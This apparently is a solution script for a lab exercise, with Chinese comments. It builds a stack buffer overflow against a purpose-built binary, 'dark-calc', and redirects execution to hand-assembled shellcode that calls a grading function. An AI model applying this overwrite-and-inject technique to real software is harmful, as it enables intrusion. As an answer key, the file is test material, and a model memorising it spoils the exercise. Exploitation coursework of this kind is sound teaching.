#!/usr/bin/env python3
"""Task 2: 栈空间执行（shellcode）——dark-calc

dark-calc 和普通程序不一样：.init_array 里挂了 init_fixed_stack()，它用
mmap(MAP_FIXED_NOREPLACE) 在 0x721000000000 固定映射了 8MB 的 RWX 内存，
再由 __wrap_main 把 rsp 指到这块内存的顶端 0x721000801000。于是：

    fixed_stack_top = 0x721000801000  （它上面那一页被 mprotect 成 PROT_NONE，是保护页）
    main  的 rbp    = 0x721000800ff0
    input 的 rbp    = 0x721000800fe0
    expression[16]  = 0x721000800fd0  <- 缓冲区地址固定，和 ASLR 无关
    saved rbp       = 0x721000800fe0
    返回地址槽      = 0x721000800fe8

缓冲区往上只有 0x30 = 48 字节就到保护页，所以 payload 必须 <= 47 字节；
写满 48 字节时 gets() 补的 '\\0' 就落到保护页上，会当场 SIGSEGV。

shellcode 只有 12 字节，正好放在返回地址槽后面那片 16 字节里：
    mov edi, 4                ; rdi = 4
    mov eax, grade_eval
    call rax                  ; grade_eval(4) -> 打印 Hope A ...（内部会 fflush）
进入 shellcode 时 rsp = 返回地址槽 + 8 = 0x721000800ff0，正好 16 字节对齐，
call 之后 callee 看到的是 8 (mod 16)，满足 ABI，printf 不会崩。
grade_eval 返回后 shellcode 已经执行完，进程会继续往下跑到保护页而段错误；
但那时输出已经被 grade_eval 里的 fflush 刷出去了，不影响结果。
（想在固定栈顶上"干净退出"几乎没有空间，这里就不折腾了。）
"""
import struct
import sys

BUF_ADDR = 0x721000800FD0        # expression[16] 在固定栈上的地址
CODE_AT = BUF_ADDR + 32          # 返回地址槽之后的 16 字节
GRADE_EVAL = 0x401A87

sc = b"\xbf" + struct.pack("<I", 4)              # mov edi, 4
sc += b"\xb8" + struct.pack("<I", GRADE_EVAL)    # mov eax, grade_eval
sc += b"\xff\xd0"                                # call rax

payload = b"A" * 16                              # expression[16]
payload += b"B" * 8                              # saved rbp
payload += struct.pack("<Q", CODE_AT)            # 返回地址 -> 栈上的 shellcode
payload += sc                                    # 12 字节机器码

assert len(payload) <= 47, "payload 会撞到栈顶保护页"
sys.stdout.buffer.write(payload)
